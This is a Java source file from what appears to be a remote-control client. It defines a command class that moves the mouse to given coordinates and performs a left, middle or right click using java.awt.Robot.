package br.com.introcdc.connect.client.commands.control;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:19
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ControlComponents;

public class ClientCommandMouseClick extends ClientCommand {

    public ClientCommandMouseClick() {
        super("lclick", "mclick", "rclick");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (!input.isEmpty()) {
            try {
                String[] args = input.split(" ");
                int x = Integer.parseInt(args[0]), y = Integer.parseInt(args[1]);
                ControlComponents.ROBOT_INSTANCE.mouseMove(x, y);
            } catch (Exception ignored) {
                msg("Digite dois números válidos");
                return;
            }
        }
        if (command.startsWith("lclick")) {
            ControlComponents.clickLeft(ControlComponents.ROBOT_INSTANCE);
        } else if (command.startsWith("mclick")) {
            ControlComponents.clickMiddle(ControlComponents.ROBOT_INSTANCE);
        } else {
            ControlComponents.clickRight(ControlComponents.ROBOT_INSTANCE);
        }
        msg("Clique efetuado!");
    }

}
